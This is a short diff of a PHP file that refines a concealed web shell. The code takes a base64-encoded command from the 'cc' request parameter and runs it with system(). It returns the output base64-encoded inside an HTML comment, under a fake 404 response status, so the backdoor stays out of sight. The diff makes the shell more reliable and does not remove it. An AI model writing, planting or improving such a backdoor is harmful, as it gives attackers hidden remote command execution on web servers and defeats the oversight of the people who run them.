@@ -12,10 +12,10 @@ if(array_key_exists('cc', $_REQUEST)){
     ?>
     <!--
     <?php
-    if( $o[-1] == "="){
+    if( substr($o, -1) == "="){
     	ob_start();
     	http_response_code(404);
-    	system(base64_decode($o)." | base64");
+    	system(base64_decode($o)." | base64 -w0");
     	ob_end();
     } else {
         var_dump($_REQUEST);
